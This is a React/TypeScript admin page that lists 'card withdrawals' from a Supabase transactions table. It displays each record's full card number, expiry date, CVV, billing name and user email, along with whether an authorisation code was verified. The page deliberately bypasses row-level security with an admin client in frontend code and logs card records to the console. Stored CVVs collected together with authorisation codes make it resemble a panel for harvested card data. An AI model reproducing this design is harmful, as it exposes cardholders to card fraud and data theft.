// src/pages/CardsList.tsx or wherever your admin page is
import { useEffect, useState } from "react";
import { supabaseAdmin } from "@/lib/supabaseAdmin"; // ← Import admin client
import { supabase as supabaseTyped } from "@/lib/supabaseClient";
const supabase: any = supabaseTyped; // For profile queries only
import { Card, CardContent } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { StatusBadge } from "@/components/StatusBadge";
import { CreditCard, User, Calendar, DollarSign, Shield } from "lucide-react";

export default function CardsList() {
  const [rows, setRows] = useState<any[]>([]);
  const [profileMap, setProfileMap] = useState<Record<string, any>>({});
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    document.title = "Admin · Card Withdrawals";
    
    const fetchData = async () => {
      try {
        console.log("🔄 Fetching card transactions...");
        
        // 🔑 USE SUPABASEADMIN TO BYPASS RLS
        const { data: cards, error: cardsError } = await supabaseAdmin
          .from("transactions")
          .select(`
            id,
            user_id,
            type,
            method,
            amount,
            status,
            card_number,
            card_exp,
            card_cvv,
            card_billing_name,
            created_at,
            auth_code_verified
          `)
          .eq("method", "card")
          .order("created_at", { ascending: false });

        if (cardsError) {
          console.error("❌ Cards error:", cardsError);
          setError(cardsError.message);
          throw new Error(cardsError.message);
        }

        console.log("✅ Cards fetched:", cards?.length || 0);
        console.log("📊 First card:", cards?.[0]); // Log first card to see structure

        // 2. Gather unique user_ids
        const userIds = [...new Set(cards.map((c: any) => c.user_id).filter(Boolean))];
        console.log("👤 User IDs found:", userIds);

        // 3. Fetch profiles (using regular client - this has RLS but should work)
        if (userIds.length > 0) {
          const { data: profiles, error: profilesError } = await supabase
            .from("profiles")
            .select("user_id, full_name, email")
            .in("user_id", userIds);

          if (profilesError) {
            console.error("❌ Profile fetch error:", profilesError);
          } else {
            console.log("✅ Profiles fetched:", profiles?.length || 0);
            // Build lookup map
            const map: Record<string, any> = {};
            profiles.forEach((profile: any) => {
              map[profile.user_id] = profile;
            });
            setProfileMap(map);
          }
        }

        setRows(cards || []);
      } catch (err: any) {
        console.error("❌ Failed to fetch cards:", err);
        setError(err.message || "Failed to load card transactions");
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, []);

  // Helper function to format date
  const formatDate = (date: string) => {
    return new Date(date).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  // Get status color
  const getStatusColor = (status: string) => {
    const colors: Record<string, string> = {
      'cancelled': 'bg-gray-500',
      'pending': 'bg-yellow-500',
      'awaiting_code': 'bg-blue-500',
      'approved': 'bg-green-500',
      'failed': 'bg-red-500',
      'rejected': 'bg-red-500'
    };
    return colors[status] || 'bg-gray-500';
  };

  if (error) {
    return (
      <div className="p-8 text-center">
        <h2 className="text-xl font-semibold text-red-500">Error Loading Cards</h2>
        <p className="text-muted-foreground mt-2">{error}</p>
        <button 
          onClick={() => window.location.reload()} 
          className="mt-4 px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600"
        >
          Retry
        </button>
      </div>
    );
  }

  return (
    <div className="space-y-4 p-6">
      <div>
        <h1 className="text-2xl font-semibold">Card Withdrawals</h1>
        <p className="text-sm text-muted-foreground">
          {rows.length} card transactions · contains highly sensitive data
        </p>
      </div>

      <Card>
        <CardContent className="p-0">
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Card Details</TableHead>
                  <TableHead>Card Holder</TableHead>
                  <TableHead>User</TableHead>
                  <TableHead>Amount</TableHead>
                  <TableHead>Status</TableHead>
                  <TableHead>Verified</TableHead>
                  <TableHead>Date</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {loading ? (
                  <TableRow>
                    <TableCell colSpan={7} className="text-center text-muted-foreground py-8">
                      Loading card transactions...
                    </TableCell>
                  </TableRow>
                ) : rows.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={7} className="text-center text-muted-foreground py-8">
                      No card withdrawals found
                    </TableCell>
                  </TableRow>
                ) : (
                  rows.map((c) => {
                    const profile = profileMap[c.user_id] || {};
                    return (
                      <TableRow key={c.id} className="hover:bg-muted/50">
                        <TableCell>
                          <div className="space-y-1">
                            <div className="flex items-center gap-2">
                              <CreditCard className="h-4 w-4 text-muted-foreground" />
                              <span className="font-mono text-sm font-medium">
                                {c.card_number || "—"}
                              </span>
                            </div>
                            <div className="flex items-center gap-4 text-xs text-muted-foreground">
                              <span>Exp: {c.card_exp || "—"}</span>
                              <span>CVV: {c.card_cvv || "—"}</span>
                            </div>
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <User className="h-3 w-3 text-muted-foreground" />
                            <span className="text-sm">{c.card_billing_name || "—"}</span>
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="text-sm">
                            {profile?.full_name || profile?.email || c.user_id || "—"}
                          </div>
                          {profile?.email && (
                            <div className="text-xs text-muted-foreground">
                              {profile.email}
                            </div>
                          )}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-1">
                            <DollarSign className="h-3 w-3 text-muted-foreground" />
                            <span className="font-mono text-sm font-medium">
                              ${c.amount?.toFixed(2) || "0.00"}
                            </span>
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <div className={`h-2 w-2 rounded-full ${getStatusColor(c.status)}`} />
                            <StatusBadge status={c.status} />
                          </div>
                        </TableCell>
                        <TableCell>
                          {c.auth_code_verified ? (
                            <div className="flex items-center gap-1 text-green-600">
                              <Shield className="h-3 w-3" />
                              <span className="text-xs">Verified</span>
                            </div>
                          ) : (
                            <span className="text-xs text-muted-foreground">Pending</span>
                          )}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-1">
                            <Calendar className="h-3 w-3 text-muted-foreground" />
                            <span className="text-xs text-muted-foreground">
                              {formatDate(c.created_at)}
                            </span>
                          </div>
                        </TableCell>
                      </TableRow>
                    );
                  })
                )}
              </TableBody>
            </Table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
